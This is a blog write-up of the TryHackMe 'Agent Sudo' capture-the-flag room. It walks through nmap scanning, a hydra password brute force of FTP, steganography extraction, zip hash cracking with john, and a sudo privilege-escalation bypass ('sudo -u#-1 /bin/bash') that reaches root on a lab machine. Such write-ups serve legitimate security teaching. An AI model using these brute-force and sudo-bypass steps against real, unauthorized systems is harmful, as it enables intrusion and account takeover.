---
title: "Agent Sudo"
date: 2024-07-02
draft: false
summary: "Writeup for Agent Sudo CTF challenge on TryHackMe."
tags: ["linux", "sudo", "steganography", "hash crack"]
categories: ["writeups"]
series: []
showToc: true
cover:
  image: "https://cdn.ziomsec.com/agent_sudo/cover.webp"
  caption: "Agent Sudo TryHackMe Challenge"
  alt: "Agent Sudo cover"
platform: "TryHackMe"
---

We found a secret server located under the deep sea. Our task is to hack inside the server and reveal the truth.
<!--more-->
To access the lab, click on the link given below:-
- https://tryhackme.com/r/room/agentsudoctf

## Recon

I performed an **nmap** aggressive scan to identify open ports and running services.

```shell
nmap -A TARGET -T4
```

| **Port** | **Service** |
| -------- | ----------- |
| 21       | ftp         |
| 22       | ssh         |
| 80       | http        |

![](https://cdn.ziomsec.com/agent_sudo/1.webp)

## Initial Foothold

I accessed the web server using **curl** and received instructions on how to access the page.

```shell
curl http://TARGET
```

![](https://cdn.ziomsec.com/agent_sudo/2.webp)

Since the message was written by *Agent R*, I tried using the nickname *R* to access the page and received a new message.

```shell
curl -A 'R' -L http://TARGET
```
> The **-L** flag in curl is used to follow redirects.

![](https://cdn.ziomsec.com/agent_sudo/3.webp)

I tried accessing different pages by changing the alphabet and finally found a way to get in when I used **C**.

```shell
curl -A 'c' -L http://target
```

![](https://cdn.ziomsec.com/agent_sudo/4.webp)

I found a username called *chris* so I attempted to crack its password for the other 2 services found running, namely *ftp* and *ssh*.

```shell
hydra -l 'chris' -P /usr/share/wordlists/rockyou.txt ftp://TARGET
```

![](https://cdn.ziomsec.com/agent_sudo/5.webp)

| username | password |
| -------- | -------- |
| chris    | crystal  |

I then connected to the *ftp* server using these credentials.

```shell
ftp chris@TARGET
# enter password
```

![](https://cdn.ziomsec.com/agent_sudo/6.webp)

I then downloaded all the files from the server.

```ftp
get To_agent3.txt
get cute-alien.jpg
get cutie.png
```

![](https://cdn.ziomsec.com/agent_sudo/7.webp)

The txt file provided a hint for getting the credentials for *agent J*.

![](https://cdn.ziomsec.com/agent_sudo/8.webp)

I then used **binwalk** to search for hidden files inside the images and found some in the *cutie.png*.

```shell
binwalk cutie.png
```

![](https://cdn.ziomsec.com/agent_sudo/9.webp)

I then extracted the file from inside the image.

```shell
binwalk cutie.png -e --run-as=root
```

![](https://cdn.ziomsec.com/agent_sudo/10.webp)

The hidden folder contained a zip file. However, this file was password protected - so I converted it to **john** crackable format and cracked its password using **john**.

![](https://cdn.ziomsec.com/agent_sudo/11.webp)

```shell
zip2john 8702.zip > myzip.hash
john myzip.hash
```

![](https://cdn.ziomsec.com/agent_sudo/12.webp)

I then extracted the files from the **zip** using this password.

```shell
7z e 8702.zip
# enter password
```

![](https://cdn.ziomsec.com/agent_sudo/13.webp)

The zip contained a txt file, so I read that.

![](https://cdn.ziomsec.com/agent_sudo/14.webp)

The text inside `''` looked encoded, so I visited **CyberChef** and decoded it
- https://gchq.github.io/CyberChef/ 

![](https://cdn.ziomsec.com/agent_sudo/15.webp)

I used the **steghide** command with the password *Area51* to extract information from the JPEG image file.

```shell
steghide extract -sf cute-alien.jpg
```

![](https://cdn.ziomsec.com/agent_sudo/16.webp)

I read the *message.txt* file and found the password of *james*.

![](https://cdn.ziomsec.com/agent_sudo/17.webp)

I then logged as *james* via **SSH**.

```shell
ssh james@TARGET
```

![](https://cdn.ziomsec.com/agent_sudo/18.webp)

I captured the first flag from my home directory.

![](https://cdn.ziomsec.com/agent_sudo/19.webp)

There was another image along with my flag. I transferred it to my system using an **HTTP** server.

```shell
python3 -m http.server 8080
```

![](https://cdn.ziomsec.com/agent_sudo/20.webp)

```shell
wget http://TARGET:8080/alien_autospy.jpg
```

![](https://cdn.ziomsec.com/agent_sudo/21.webp)

I then conducted a Google reverse image search to gather more information about the image.

![](https://cdn.ziomsec.com/agent_sudo/22.webp)

## Privilege Escalation

### Enumeration
I downloaded the **Linux Smart Enumeration** script and ran it on the target.
- https://github.com/diego-treitos/linux-smart-enumeration

![](https://cdn.ziomsec.com/agent_sudo/23.webp)

![](https://cdn.ziomsec.com/agent_sudo/24.webp)

![](https://cdn.ziomsec.com/agent_sudo/25.webp)

The script identified a very interesting permission. We could run the `/bin/bash` shell as any user accept *root*.

![](https://cdn.ziomsec.com/agent_sudo/26.webp)

I manually verified the same and checked my **sudo** version to search for ways to bypass this restriction.

```shell
sudo -l
sudo --version
```

![](https://cdn.ziomsec.com/agent_sudo/27.webp)

### Bypassing Sudo Restriction
**Exploit-DB** contained a bypass that would work on my **sudo** version.

![](https://cdn.ziomsec.com/agent_sudo/28.webp)

I read the **POC** and replicated it to escalate my privileges.

```
sudo -u#-1 /bin/bash
```

![](https://cdn.ziomsec.com/agent_sudo/29.webp)

I captured the *root* flag and revealed Agent R's identity.

![](https://cdn.ziomsec.com/agent_sudo/30.webp)

## Closure

Here's a summary of how I compromised **agent sudo**:
- I accessed the web server, which required a specific **user-agent** for entry.
- After gaining access, I conducted a **password spray** attack and discovered **chris's** **ftp** password.
- Downloading all files from the **ftp** server, I uncovered hidden messages and passwords within images.
- Using **john**, I cracked the password for *cutie.png* and obtained access to *cute-alien.jpeg*.
- Extracting files from *cute-alien.jpeg*, I found credentials for **ssh** login.
- With these credentials, I established initial access.
- Finally, identifying a vulnerability in **sudo**, I applied an exploit from **exploit-db** to gain **root** access.

That concludes my approach. Happy hacking!

---
